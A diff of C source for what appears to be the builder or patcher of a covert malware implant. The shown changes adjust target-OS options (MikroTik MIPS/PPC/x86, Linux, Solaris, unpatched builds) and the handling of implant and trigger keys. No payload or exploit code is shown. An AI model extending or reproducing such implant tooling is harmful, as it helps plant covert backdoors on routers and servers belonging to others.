@@ -114,10 +114,9 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
 	fprintf(stdout, "                             * 'all' - default\n");
 	fprintf(stdout, "                             * 'raw' - all unpatched\n");
-	fprintf(stdout, "                             * 'win'\n");
 	fprintf(stdout, "                             * 'mt-x86'\n");
-	fprintf(stdout, "                             * 'mt-mips'\n");
-	fprintf(stdout, "                             * 'mt-mipsel'\n");
+	fprintf(stdout, "                             * 'mt-mips' (or 'mt-mipsbe' (deprecated) )\n");
+	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
 	fprintf(stdout, "                             * 'mt-ppc'\n");
 	fprintf(stdout, "                             * 'linux-x86'\n");
 	fprintf(stdout, "                             * 'sol-x86'\n");
@@ -151,22 +150,21 @@ int RandFill(char *buf, int size)
 int main(int argc, char **argv)
 {
 	int optval;
-	//struct in_addr        addr_check;
-	int linux_x86 = 0;				// Linux x86
-	int solaris_sparc = 0;				// Solaris SPARC
-	int solaris_x86 = 0;				// Solaris x86
-	int mikrotik_x86 = 0;				// MikroTik x86
-	int mikrotik_mips = 0;			// MikroTik MIPS Big Endian
-	int mikrotik_mipsel = 0;			// MikroTik MIPS Little Endian
-	int mikrotik_ppc = 0;				// MikroTik PowerPC [Big Endian]
-	int raw = 0;					// unpatched versions
-	char *host = (char *) NULL;			// cached hostname for user confirmation message
-	FILE *implantIDFile;				// Used to save implant keys and subsequent sha1 hashes...
-	time_t currentTime;				// Time stamp for ID key generation
-	struct tm *idKeyTime;				// Pointer to the ID key generation data structure
+	int linux_x86 = 0;							// Linux x86
+	int solaris_sparc = 0;						// Solaris SPARC
+	int solaris_x86 = 0;						// Solaris x86
+	int mikrotik_x86 = 0;						// MikroTik x86
+	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
+	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
+	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
+	int raw = 0;								// unpatched versions
+	char *host = (char *) NULL;					// cached hostname for user confirmation message
+	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
+	time_t currentTime;							// Time stamp for ID key generation
+	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
 	unsigned char implantKey[ID_KEY_HASH_SIZE];
 	unsigned char triggerKey[ID_KEY_HASH_SIZE];
-	enum {FALSE=0, TRUE} keyed = FALSE;		// Boolean to verify that a key was entered
+	enum {FALSE=0, TRUE} keyed = FALSE;			// Boolean to verify that a key was entered
 
 	implantKey[0] = '\0';
 
@@ -330,10 +328,10 @@ int main(int argc, char **argv)
 			if (strncmp(optarg, "mt-p", 4) == 0) {
 				// mikrotik powerpc
 				mikrotik_ppc = 1;
-			} else if (strncmp(optarg, "mt-mipsb", 8) == 0) {
+			} else if ((strncmp(optarg, "mt-mips", 8) == 0) || (strncmp(optarg, "mt-mipsbe", 8) == 0)) {
 				// mikrotik MIPS big endian
 				mikrotik_mips = 1;
-			} else if (strncmp(optarg, "mt-mipsl", 8) == 0) {
+			} else if ((strncmp(optarg, "mt-mipsel", 8) == 0) || (strncmp(optarg, "mt-mipsle", 8) == 0)) {
 				// mikrotik MIPS little endian
 				mikrotik_mipsel = 1;
 			} else if (strncmp(optarg, "mt-x", 4) == 0) {
